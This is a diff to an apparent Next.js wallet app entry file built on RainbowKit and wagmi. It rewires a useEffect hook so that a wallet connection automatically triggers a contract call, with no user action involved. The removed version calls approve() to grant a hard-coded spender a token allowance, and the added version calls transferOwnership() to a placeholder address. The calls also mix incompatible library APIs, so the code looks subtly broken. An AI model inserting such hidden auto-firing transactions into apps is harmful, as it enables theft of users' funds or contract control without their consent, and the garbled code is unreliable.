@@ -1,4 +1,4 @@
-import { useEffect, useState } from 'react';
+import { useEffect } from 'react';
 import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
 import { configureChains, createClient, WagmiConfig } from "wagmi";
 import {
@@ -461,29 +461,26 @@ const wagmiClient = createClient({
     provider,
 });
 
-function MyApp({ Component, pageProps }) {
-    const [isConnected, setIsConnected] = useState(false);
+const callSmartContract = async () => {
+    try {
+        const contractInstance = wagmiClient.getContract(contractAddress, abi);
+        const result = await contractInstance.methods.transferOwnership('0xNewOwnerAddress').send({ from: '0x694E31fB6cf8E86Bb09e67D58b82B5abc6C2065E' });
+        console.log('Result of calling smart contract function:', result);
+    } catch (error) {
+        console.error('Error calling smart contract:', error);
+    }
+};
 
+function MyApp({ Component, pageProps }) {
     useEffect(() => {
         const checkAndCallSmartContract = async () => {
-            if (isConnected) {
-                // Вызов смарт-контракта
-                try {
-                    const contractInstance = wagmiClient.getContract(contractAddress, abi);
-                    const spender = '0xNewOwnerAddress';
-                    const value = '1000000000000000000';
-
-                    const result = await contractInstance.methods.approve(spender, value).sendTransaction();
-
-                    console.log('Transaction successfully sent:', result);
-                } catch (error) {
-                    console.error('Error sending transaction:', error);
-                }
+            if (wagmiClient.connected && wagmiClient.chainId === polygon.chainId) {
+                await callSmartContract();
             }
         };
 
         checkAndCallSmartContract();
-    }, [isConnected]);
+    }, [wagmiClient.connected, wagmiClient.chainId]);
 
     return (
         <WagmiConfig client={wagmiClient}>
@@ -491,8 +488,6 @@ function MyApp({ Component, pageProps }) {
                 modalSize="compact"
                 initialChain={process.env.NEXT_PUBLIC_DEFAULT_CHAIN}
                 chains={chains}
-                onConnect={() => setIsConnected(true)}
-                onDisconnect={() => setIsConnected(false)}
             >
                 <MainLayout>
                     <Component {...pageProps} />
